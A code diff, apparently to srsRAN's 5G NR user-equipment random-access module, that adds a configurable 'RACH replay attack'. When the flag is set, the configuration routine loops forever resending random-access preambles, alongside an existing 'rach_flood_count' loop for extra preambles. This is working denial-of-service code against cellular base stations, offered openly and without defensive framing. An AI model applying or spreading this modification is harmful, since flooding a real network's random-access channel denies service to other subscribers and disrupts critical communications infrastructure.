@@ -19,6 +19,8 @@
  *
  */
 
+
+
 #include "srsue/hdr/stack/mac_nr/proc_ra_nr.h"
 #include "srsran/common/standard_streams.h"
 #include "srsran/mac/mac_rar_pdu_nr.h"
@@ -28,6 +30,9 @@
 #include <iostream>
 
 namespace srsue {
+
+
+uint32_t rach_attack_val = 0;
 
 const char* state_str_nr[] = {"RA:    IDLE:   ",
                               "RA:    PDCCH_SETUP:  ",
@@ -74,6 +79,21 @@ void proc_ra_nr::set_config(const srsran::rach_cfg_nr_t& rach_cfg_)
               rach_cfg.prach_ConfigurationIndex,
               rach_cfg.preambleTransMax,
               rach_cfg.ra_responseWindow);
+
+uint32_t replay_attack_value = rach_cfg.get_rach_replay_attack();
+std::cout << "Rach replay attack value: (from set config pro cra) " << replay_attack_value << std::endl;
+rach_attack_val = replay_attack_value;
+ //std::cout << "Rach replay attack attack attack attack value: (from set config pro cra) " << 
+//rach_attack_val << std::endl;
+
+if (rach_attack_val == 1)
+{
+  while (true)
+  {
+    std::cout << "Sending RACH retransmission " << std::endl;
+    ra_preamble_transmission();
+  }
+}
 }
 
 void proc_ra_nr::start_by_rrc()
@@ -178,6 +198,8 @@ void proc_ra_nr::ra_resource_selection()
 // 5.1.3 Random Access Preamble transmission
 void proc_ra_nr::ra_preamble_transmission()
 {
+
+
   uint32_t delta_preamble        = 0; // TODO calulate the delta preamble based on delta_preamble_db_table_nr
   preamble_received_target_power = rach_cfg.PreambleReceivedTargetPower + delta_preamble +
                                    (preamble_transmission_counter - 1) * rach_cfg.powerRampingStep +
@@ -190,7 +212,7 @@ void proc_ra_nr::ra_preamble_transmission()
   prach_occasion = 0;
   // instruct the physical layer to transmit the Random Access Preamble using the selected PRACH occasion, corresponding
   // RA-RNTI (if available), PREAMBLE_INDEX, and PREAMBLE_RECEIVED_TARGET_POWER.
-
+  // std::cout<<"Rach flood count :"<< rach_cfg.rach_flood_count<<std::endl;
   if(rach_cfg.rach_flood_count > 0){
     for(uint32_t i = 0; i < rach_cfg.rach_flood_count; i++){
       std::cout << "Sending extra RACH reamble" << std::endl;
@@ -202,7 +224,9 @@ void proc_ra_nr::ra_preamble_transmission()
   prach_send_timer.set(PRACH_SEND_CALLBACK_TIMEOUT, [this](uint32_t tid) { timer_expired(tid); });
   prach_send_timer.run();
   state = WAITING_FOR_PRACH_SENT;
+  //}
 }
+
 
 // 5.1.4 Random Access Preamble transmission
 void proc_ra_nr::ra_response_reception(const mac_interface_phy_nr::tb_action_dl_result_t& tb)
